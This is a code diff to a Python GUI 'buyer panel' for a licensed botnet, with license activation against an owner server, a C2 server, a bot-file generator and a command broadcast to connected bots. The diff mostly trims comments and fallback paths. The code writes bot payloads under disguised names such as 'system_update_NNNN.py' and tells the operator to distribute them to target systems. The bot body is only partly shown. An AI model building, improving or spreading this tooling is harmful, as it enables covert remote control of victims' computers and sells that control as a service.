@@ -9,7 +9,7 @@ import os
 from datetime import datetime
 import sys
 
-LICENSE_KEY = "{{LICENSE_KEY}}"
+LICENSE_KEY = "YOUR_LICENSE_KEY_HERE"
 OWNER_HOST = "localhost"
 OWNER_PORT = 9999
 
@@ -26,29 +26,19 @@ class BuyerClient:
     def setup_working_directory(self):
         """Set working directory to a writable location"""
         try:
-            # Try user's home directory first
             home_dir = os.path.expanduser("~")
             bot_files_dir = os.path.join(home_dir, "Bot_Files")
             
-            # Create directory if it doesn't exist
             if not os.path.exists(bot_files_dir):
                 os.makedirs(bot_files_dir)
             
-            # Change to that directory
             os.chdir(bot_files_dir)
             self.log_message(f"✅ Working directory: {bot_files_dir}")
             return True
             
         except Exception as e:
             self.log_message(f"❌ Failed to set working directory: {e}")
-            # Try current directory as fallback
-            try:
-                current_dir = os.getcwd()
-                self.log_message(f"⚠️ Using current directory: {current_dir}")
-                return True
-            except:
-                self.log_message("❌ All directory options failed!")
-                return False
+            return False
         
     def connect_to_owner(self):
         """Connect to owner server and activate license"""
@@ -111,7 +101,7 @@ class BuyerClient:
                         owner_sock.send(json.dumps(notify_msg).encode())
                         owner_sock.close()
                     except:
-                        pass  # Silent fail for owner notification
+                        pass
                         
             except Exception as e:
                 self.log_message(f"❌ Error handling bot: {e}")
@@ -148,7 +138,7 @@ class BuyerClient:
                 local_ip = "127.0.0.1"
                 self.log_message("⚠️ Using localhost IP - bots on same machine only")
             
-            # SIMPLE BOT CODE - No admin requirements, just basic connection
+            # Bot code
             bot_code = f'''import socket
 import json
 import platform
@@ -213,7 +203,7 @@ if __name__ == "__main__":
 '''
             filename = f"system_update_{random.randint(1000,9999)}.py"
             
-            # Write file with error handling
+            # Write file
             with open(filename, "w", encoding='utf-8') as f:
                 f.write(bot_code)
                 
@@ -223,17 +213,7 @@ if __name__ == "__main__":
             
         except Exception as e:
             self.log_message(f"❌ Error creating bot file: {e}")
-            # Try alternative location
-            try:
-                filename = f"bot_{random.randint(1000,9999)}.py"
-                desktop_path = os.path.join(os.path.expanduser("~"), "Desktop", filename)
-                with open(desktop_path, "w", encoding='utf-8') as f:
-                    f.write(bot_code)
-                self.log_message(f"✅ Bot file created on Desktop: {desktop_path}")
-                return desktop_path
-            except Exception as e2:
-                self.log_message(f"❌ Even desktop creation failed: {e2}")
-                return None
+            return None
         
     def setup_gui(self):
         """Setup the buyer panel GUI"""
@@ -295,15 +275,6 @@ if __name__ == "__main__":
         self.license_status = tk.Label(stats_frame, text="License: Not Activated", bg='#1e1e1e', fg='red')
         self.license_status.pack(anchor='w')
         
-        # Current directory info
-        dir_frame = tk.LabelFrame(left, text="File Location", bg='#1e1e1e', fg='white')
-        dir_frame.pack(fill='x', pady=(0, 10))
-        
-        current_dir = os.getcwd()
-        dir_label = tk.Label(dir_frame, text=f"Files saved to:\\n{current_dir}", 
-                           bg='#1e1e1e', fg='#cccccc', font=('Arial', 8), justify='left')
-        dir_label.pack(fill='x', padx=5, pady=5)
-        
         # Command section
         cmd_frame = tk.LabelFrame(left, text="Bot Commands", bg='#1e1e1e', fg='white')
         cmd_frame.pack(fill='x', pady=(0, 10))
@@ -351,7 +322,6 @@ if __name__ == "__main__":
         # Start UI updates
         self.root.after(1000, self.update_display)
         self.log_message("✅ Buyer panel started successfully")
-        self.log_message(f"📁 Files will be saved to: {current_dir}")
         self.root.mainloop()
         
     def activate_license(self):
@@ -361,11 +331,12 @@ if __name__ == "__main__":
             self.status_label.config(text="Status: ✅ Activated", fg="green")
             self.license_status.config(text="License: ✅ Activated", fg="green")
             self.log_message("✅ License activated successfully!")
-            messagebox.showinfo("Success", "License activated successfully!\\nYou can now start the C2 server.")
+            messagebox.showinfo("Success", "License activated successfully!\nYou can now start the C2 server.")
         else:
             self.status_label.config(text="Status: ❌ Activation Failed", fg="red")
             self.license_status.config(text="License: ❌ Activation Failed", fg="red")
-            messagebox.showerror("Error", "License activation failed!\\n\\nCheck:\\n1. Owner server is running\\n2. License key is valid\\n3. Network connection")
+            self.log_message("❌ License activation failed!")
+            messagebox.showerror("Error", "License activation failed!\n\nCheck:\n1. Owner server is running\n2. License key is valid\n3. Network connection")
             
     def start_server(self):
         """Start the C2 server"""
@@ -377,7 +348,7 @@ if __name__ == "__main__":
             self.status_label.config(text=f"Status: ✅ C2 Running on port {self.c2_port}")
             self.port_label.config(text=f"C2 Port: {self.c2_port}")
             self.log_message(f"✅ C2 server started on port {self.c2_port}")
-            messagebox.showinfo("Success", f"C2 server started on port {self.c2_port}\\n\\nYou can now generate bot files.")
+            messagebox.showinfo("Success", f"C2 server started on port {self.c2_port}\n\nYou can now generate bot files.")
         else:
             self.log_message("❌ Failed to start C2 server")
             
@@ -391,12 +362,11 @@ if __name__ == "__main__":
             messagebox.showerror("Error", "Please start C2 server first!")
             return
             
-        self.log_message("🔄 Creating bot file...")
         bot_file = self.create_bot_file()
         if bot_file:
-            messagebox.showinfo("Success", f"Bot file created successfully!\\n\\nLocation: {bot_file}\\n\\nDistribute this file to target systems.")
+            messagebox.showinfo("Success", f"Bot file created: {bot_file}\n\nDistribute this file to target systems.")
         else:
-            messagebox.showerror("Error", "Failed to create bot file!\\n\\nCheck file permissions or try running as administrator.")
+            messagebox.showerror("Error", "Failed to create bot file!")
             
     def send_command(self):
         """Send command to all connected bots"""
@@ -454,7 +424,7 @@ if __name__ == "__main__":
     def log_message(self, message):
         """Add message to log"""
         timestamp = datetime.now().strftime("%H:%M:%S")
-        self.log_text.insert(tk.END, f"[{timestamp}] {message}\\n")
+        self.log_text.insert(tk.END, f"[{timestamp}] {message}\n")
         self.log_text.see(tk.END)
 
 if __name__ == "__main__":
